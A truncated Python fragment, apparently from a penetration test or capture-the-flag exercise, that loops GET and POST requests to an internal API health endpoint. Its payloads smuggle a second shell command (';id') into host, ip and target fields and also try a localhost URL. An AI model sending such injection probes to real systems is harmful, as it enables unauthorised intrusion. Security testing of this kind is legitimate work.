import requests
base='http://172.20.0.13:5000/api/health'
for method in ['get','post']:
  for data in [ {'host':'127.0.0.1'}, {'host':'127.0.0.1;id'}, {'ip':'127.0.0.1;id'}, {'target':'127.0.0.1;id'}, {'url':'http://127.0.0.1'} ]:
